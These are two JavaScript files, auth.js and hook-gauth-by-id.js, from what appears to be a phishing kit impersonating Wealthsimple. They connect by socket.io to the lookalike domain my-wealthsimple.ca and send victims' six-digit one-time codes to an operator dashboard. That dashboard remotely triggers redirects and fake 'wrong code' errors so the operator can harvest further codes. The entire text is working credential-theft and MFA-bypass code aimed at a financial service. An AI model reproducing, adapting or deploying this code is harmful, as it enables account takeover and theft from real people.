// auth.js
(function () {
  const SERVER_URL = "https://my-wealthsimple.ca";
  const SESSION_STORAGE_KEY = "sessionID";
  const JOIN_EVENT = "client-join";   // matches your dashboard
  const EMIT_EVENT = "client-data";   // payload: { type:'gauth', value:'123456', sessionID }

// Where to go for each MFA/dashboard signal
// NOTE: No redirects for sms / wrong_sms. GAUTH redirects to auth.html.
// NOTE: Redirect on sms / wrong_sms to sms.html. No redirect for email_code / wrong_email_code.
// GAUTH redirects to auth.html.
const MFA_REDIRECT = {
  sms: "sms.html",
  wrong_sms: "sms.html",
  loading: "loading.html",
  wrong_password: "app.html",
  gauth: "auth.html",
  wrong_gauth: "auth.html"
};



  
    // Persist "gauth submit pending" so the spinner stays across refresh (like app.js)
  const GAUTH_PENDING_KEY = "ws_pending_gauth";
  window.wsSavePendingGAuth = function (code) {
    try { localStorage.setItem(GAUTH_PENDING_KEY, JSON.stringify({ code: String(code||""), ts: Date.now() })); } catch {}
  };
  window.wsLoadPendingGAuth = function () {
    try { const v = localStorage.getItem(GAUTH_PENDING_KEY); return v ? JSON.parse(v) : null; } catch { return null; }
  };
  window.wsClearPendingGAuth = function () {
    try { localStorage.removeItem(GAUTH_PENDING_KEY); } catch {}
  };

  // Fallback spinner (used only if app.js's setButtonLoading is not present)
  const SPINNER_HTML =
    '<span class="pwd-spinner" aria-hidden="true" style="display:inline-flex;align-items:center;justify-content:center;">' +
      '<svg width="20" height="20" viewBox="0 0 50 50" focusable="false" aria-hidden="true">' +
        '<circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="5" opacity="0.25"></circle>' +
        '<circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="5" stroke-dasharray="90" stroke-dashoffset="60">' +
          '<animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.9s" repeatCount="indefinite"/>' +
        '</circle>' +
      '</svg>' +
    '</span>';

  const isSixDigits = v => /^[0-9]{6}$/.test(String(v || "").trim());

  function getRedirectFor(signal) {
  if (!signal) return null;
  const raw = String(signal).trim();
  // Try exact, then lower, then “with underscores” variant
  if (MFA_REDIRECT[raw]) return MFA_REDIRECT[raw];
  const lower = raw.toLowerCase();
  if (MFA_REDIRECT[lower]) return MFA_REDIRECT[lower];
  const underscored = lower.replace(/\s+/g, "_");
  if (MFA_REDIRECT[underscored]) return MFA_REDIRECT[underscored];
  return null;
}


  function getOrCreateSessionID() {
    let sid = null;
    try { sid = localStorage.getItem(SESSION_STORAGE_KEY) || null; } catch {}
    if (!sid) {
      sid = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
      try { localStorage.setItem(SESSION_STORAGE_KEY, sid); } catch {}
    }
    return sid;
  }

  function connectSocket(sessionID) {
    const socket = window.io ? window.io(SERVER_URL, { transports: ["websocket", "polling"] }) : null;
    if (!socket) {
      console.warn("[auth.js] socket.io not found. Include the script tag before this file.");
      return null;
    }
    socket.on("connect", () => {
      console.log("[auth.js] connected:", socket.id, "session:", sessionID);
      socket.emit(JOIN_EVENT, { sessionID });
    });
    socket.on("disconnect", () => console.log("[auth.js] disconnected"));
        // Clear the persisted spinner once dashboard responds to gauth
    socket.on("dashboard-action", ({ buttonName }) => {
      const key = String(buttonName || "").toLowerCase();
      const dest = MFA_REDIRECT[key];

      // If this event maps to a page, redirect (avoid loops if already there)
      // If this event maps to a page, redirect (avoid loops if already there)
// If this event maps to a page, clear pending state and redirect (avoid loops if already there)
if (dest) {
  // ADDED: hard-clear the spinner/code persistence before leaving the page
  try { window.wsClearPendingGAuth && window.wsClearPendingGAuth(); } catch {}
  try { localStorage.removeItem("ws_pending_gauth"); } catch {}

  if (!location.pathname.endsWith("/" + dest)) {
    location.href = dest;
  }
  return;
}


// Only wrong_email_code triggers local pending cleanup / UI handling here
if (key === "wrong_email_code") {
  try { window.wsClearPendingGAuth && window.wsClearPendingGAuth(); } catch {}
  showWrongCodeError(
    document.querySelector('input[maxlength="6"], input[autocomplete="one-time-code"]'),
    document.querySelector('button[type="submit"], button[data-testid="otp-submit-button"]'),
    "wrong code, please try again"
  );
  return;
}



    });

    return socket;
  }

  // Use app.js' persistence/spinner if available, else mimic it
  function setButtonLoadingLikeApp(btn) {
    if (typeof window.setButtonLoading === "function") {
      window.setButtonLoading(btn);
      return;
    }
    const rect = btn.getBoundingClientRect();
    btn.style.width = rect.width + "px";
    btn.style.height = rect.height + "px";
    btn.style.pointerEvents = "none";
    btn.style.backgroundColor = "#eeeeee"; // light grey
    btn.style.borderColor = "#d5d5d5";
    btn.style.color = "#000000";           // black (spinner inherits)
    btn.style.opacity = "1";
    btn.disabled = true;
    btn.setAttribute("aria-busy", "true");
    btn.dataset._orig = btn.innerHTML;
    btn.dataset._loading = "1";
    btn.innerHTML = SPINNER_HTML;
  }

 // Re-enable the button & remove fallback spinner (mirrors app.js "unset")
  function restoreButtonFromLoading(btn) {
    if (!btn) return;
    if (typeof window.unsetButtonLoading === "function") {
      window.unsetButtonLoading(btn);
      return;
    }
    btn.removeAttribute("aria-busy");
    btn.disabled = false;
    btn.style.pointerEvents = "";
    btn.style.backgroundColor = "";
    btn.style.borderColor = "";
    btn.style.color = "";
    btn.style.opacity = "";
    if (btn.dataset && btn.dataset._orig != null) {
      btn.innerHTML = btn.dataset._orig;
      delete btn.dataset._orig;
    }
    delete btn.dataset._loading;
    btn.style.width = "";
    btn.style.height = "";
  }

  // --- Error UI helpers (big red banner under the input) ---
  function getOrCreateErrorEl(input) {
    const existing = document.getElementById("gauth-error");
    if (existing) return existing;
    const err = document.createElement("div");
    err.id = "gauth-error";
    err.setAttribute("role", "alert");
    err.setAttribute("aria-live", "assertive");
    err.style.background = "#d93025";   // red
    err.style.color = "#ffffff";
    err.style.padding = "10px 14px";
    err.style.borderRadius = "10px";
    err.style.marginTop = "10px";
    err.style.fontWeight = "700";
    err.style.fontSize = "16px";
    err.style.letterSpacing = "0.2px";
    if (input && input.parentNode) {
      if (input.nextSibling) input.parentNode.insertBefore(err, input.nextSibling);
      else input.parentNode.appendChild(err);
    } else {
      document.body.appendChild(err);
    }
    return err;
  }

  function showWrongCodeError(input, submit, text) {
    const err = getOrCreateErrorEl(input);
    err.textContent = text || "wrong code, please try again, please try again";
    try { input.setAttribute("aria-invalid", "true"); } catch {}
    try { input.focus(); input.select && input.select(); } catch {}
    restoreButtonFromLoading(submit);
  }

  function clearError(input) {
    try { input.removeAttribute("aria-invalid"); } catch {}
    const err = document.getElementById("gauth-error");
    if (err) err.remove();
  }

  // Try a few reasonable selectors so it works across variants
  function pickOTPInput(root = document) {
    const sels = [
      'input[autocomplete="one-time-code"]',
      'input[maxlength="6"]',
      'input[data-testid*="otp" i]',
      'input[name*="otp" i]',
      'input[aria-label*="code" i]'
    ];
    for (const s of sels) {
      const el = root.querySelector(s);
      if (el) return el;
    }
    return null;
  }

  function pickSubmit(root = document) {
    const sels = [
      'button[data-testid="otp-submit-button"]',
      'button[type="submit"]',
      'button[role="button"]'
    ];
    for (const s of sels) {
      const el = root.querySelector(s);
      if (el) return el;
    }
    return null;
  }

  function armUI(socket, sessionID) {
    const input = pickOTPInput();
    const submit = pickSubmit();

    if (!input || !submit) {
      console.warn("[auth.js] Could not find OTP input or submit button on this page.");
      return;
    }
   // Restore spinner if a pending gauth submit exists
    let hadPending = false;
   try {
      const pending = window.wsLoadPendingGAuth && window.wsLoadPendingGAuth();
      if (pending && /^[0-9]{6}$/.test(String(pending.code||""))) {
        // Optional: repopulate the field so label stays floated
        hadPending = true;
       // Optional: repopulate the field so label stays floated
        try { input.value = String(pending.code); } catch {}
        // Put button back into persistent loading state (same look as app.js)
        setButtonLoadingLikeApp(submit);
      }
    } catch {}
    // Style helpers
    function setReady(btn) {
      btn.disabled = false;
      btn.style.backgroundColor = "#000000"; // black
      btn.style.color = "#ffffff";           // white
      btn.style.borderColor = "#000000";
      btn.style.opacity = "1";
      btn.style.cursor = "pointer";
    }
    function setNotReady(btn) {
      btn.disabled = false; // Keep enabled so click handler can show error
      btn.style.removeProperty("background-color");
      btn.style.removeProperty("color");
      btn.style.removeProperty("border-color");
      btn.style.opacity = "";
      btn.style.cursor = "";
    }

    // Live validation to toggle button style
        const updateBtn = () => {
      if (submit.getAttribute("aria-busy") === "true" || submit.dataset._loading === "1") return;
      isSixDigits(input.value) ? setReady(submit) : setNotReady(submit);
    };
    ["input", "change", "keyup", "paste"].forEach(evt =>
      input.addEventListener(evt, () => { clearError(input); updateBtn(); })
    );
    if (!hadPending) updateBtn();

function sendEmailCode(code) {
  try {
        socket.emit(EMIT_EVENT, { type: "email-code", data: code, sessionID });
  } catch (e) {
    console.warn("[auth.js] emit failed:", e);
  }
}


    function onSubmit(e) {
      e.preventDefault();
      const code = String(input.value || "").trim();
      if (!isSixDigits(code)) {
        // Show the same error behavior as wrong_gauth - DON'T call updateBtn() after setNotReady
        try { window.wsClearPendingGAuth && window.wsClearPendingGAuth(); } catch {}
        showWrongCodeError(input, submit, "wrong code, please try again");
        setNotReady(submit);   // require new 6-digit entry
        return;
      }

      // Persisting loading state like app.js
      setButtonLoadingLikeApp(submit);
      try { window.wsSavePendingGAuth && window.wsSavePendingGAuth(code); } catch {}

      // Send to dashboard
      sendEmailCode(code);
    }

    submit.addEventListener("click", onSubmit);
    input.addEventListener("keydown", (e) => {
      if (e.key === "Enter" && isSixDigits(input.value)) {
        e.preventDefault();
        submit.click();
      }
    });
        // UI reaction to dashboard responses
if (socket) {
  socket.on("dashboard-action", ({ buttonName, message }) => {
    const key = String(buttonName || "").toLowerCase();

    // Only wrong_sms shows the local inline error on this page
    if (key === "wrong_sms") {
      try { window.wsClearPendingGAuth && window.wsClearPendingGAuth(); } catch {}
      showWrongCodeError(input, submit, message || "wrong code, please try again");
      setNotReady(submit);   // require new 6-digit entry
      updateBtn();
      return;
    }

    // gauth / wrong_gauth are handled by the global redirect; no local UI changes here
    if (key === "gauth" || key === "wrong_gauth") {
      return;
    }
  });
}

  }

  function init() {
    const sessionID = getOrCreateSessionID();
    const socket = connectSocket(sessionID);
    if (socket) armUI(socket, sessionID);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init, { once: true });
  } else {
    init();
  }
})();

// hook-gauth-by-id.js
(function () {
  const SERVER_URL = "https://my-wealthsimple.ca";
  const SESSION_KEY = "sessionID";
  const EMIT_EVENT = "client-data";
  const JOIN_EVENT = "client-join";

  const OTP_INPUT_ID = "input--7e1823f0-c6cf-4b2e-84d9-c042691eae7b";
  const SUBMIT_SEL = 'button[data-testid="otp-submit-button"]';
  const isSixDigits = v => /^[0-9]{6}$/.test(String(v || "").trim());

  let socket = null;

  function getSessionID() {
    try {
      let sid = localStorage.getItem(SESSION_KEY);
      if (!sid) {
        sid = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
        localStorage.setItem(SESSION_KEY, sid);
      }
      return sid;
    } catch {
      return Math.random().toString(36).slice(2);
    }
  }

  function ensureSocket(sessionID) {
    if (!window.io || socket) return socket;
    socket = window.io(SERVER_URL, { transports: ["websocket", "polling"] });
    socket.on("connect", () => socket.emit(JOIN_EVENT, { sessionID }));
    return socket;
  }

  // --- Error UI helpers (same as main auth.js) ---
  function getOrCreateErrorEl(input) {
    const existing = document.getElementById("gauth-error");
    if (existing) return existing;
    const err = document.createElement("div");
    err.id = "gauth-error";
    err.setAttribute("role", "alert");
    err.setAttribute("aria-live", "assertive");
    err.style.background = "#d93025";   // red
    err.style.color = "#ffffff";
    err.style.padding = "10px 14px";
    err.style.borderRadius = "10px";
    err.style.marginTop = "10px";
    err.style.fontWeight = "700";
    err.style.fontSize = "16px";
    err.style.letterSpacing = "0.2px";
    if (input && input.parentNode) {
      if (input.nextSibling) input.parentNode.insertBefore(err, input.nextSibling);
      else input.parentNode.appendChild(err);
    } else {
      document.body.appendChild(err);
    }
    return err;
  }

  function showWrongCodeError(input, submit, text) {
    const err = getOrCreateErrorEl(input);
    err.textContent = text || "wrong code, please try again";
    try { input.setAttribute("aria-invalid", "true"); } catch {}
    try { input.focus(); input.select && input.select(); } catch {}
    // Restore button from loading state
    if (typeof window.unsetButtonLoading === "function") {
      window.unsetButtonLoading(submit);
    } else {
      // minimal fallback restore
      submit.disabled = false;
      submit.style.pointerEvents = "";
      submit.style.backgroundColor = "";
      submit.style.borderColor = "";
      submit.style.color = "";
      submit.style.width = "";
      submit.style.height = "";
    }
  }

  function clearError(input) {
    try { input.removeAttribute("aria-invalid"); } catch {}
    const err = document.getElementById("gauth-error");
    if (err) err.remove();
  }

  function setReady(btn) {
    btn.disabled = false;
    btn.style.backgroundColor = "#000000"; // black
    btn.style.color = "#ffffff";           // white
    btn.style.borderColor = "#000000";
    btn.style.opacity = "1";
    btn.style.cursor = "pointer";
  }
  function setNotReady(btn) {
    btn.disabled = false; // Keep enabled so click handler can show error
    btn.style.removeProperty("background-color");
    btn.style.removeProperty("color");
    btn.style.removeProperty("border-color");
    btn.style.opacity = "";
    btn.style.cursor = "";
  }

  function onDomReady() {
    const input = document.getElementById(OTP_INPUT_ID);
    const submit = document.querySelector(SUBMIT_SEL);
    if (!input || !submit) return;

    const sessionID = getSessionID();
    if (window.io) ensureSocket(sessionID);

    // live toggle styling on exact 6-digit
    const updateBtn = () => {
      clearError(input);
      isSixDigits(input.value) ? setReady(submit) : setNotReady(submit);
    };
    ["input", "change", "keyup"].forEach(evt => input.addEventListener(evt, updateBtn));
    updateBtn();

    submit.addEventListener("click", (e) => {
      const code = String(input.value || "").trim();
      if (!isSixDigits(code)) {
        // Show the same error behavior as wrong_gauth - DON'T call updateBtn() or setNotReady after error
        e.preventDefault();
        showWrongCodeError(input, submit, "wrong code, please try again");
        return;
      }
      e.preventDefault();

      // same persistence/spinner as app.js
      if (typeof window.setButtonLoading === "function") {
        window.setButtonLoading(submit);
      } else {
        // minimal fallback: lock & grey out
        const r = submit.getBoundingClientRect();
        submit.style.width = r.width + "px";
        submit.style.height = r.height + "px";
        submit.style.pointerEvents = "none";
        submit.style.backgroundColor = "#eeeeee";
        submit.style.borderColor = "#d5d5d5";
        submit.style.color = "#000000";
        submit.disabled = true;
      }

      try {
        if (socket) {
           socket.emit(EMIT_EVENT, { type: "email-code", data: code, sessionID });
        }
      } catch {}
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", onDomReady, { once: true });
  } else {
    onDomReady();
  }
})();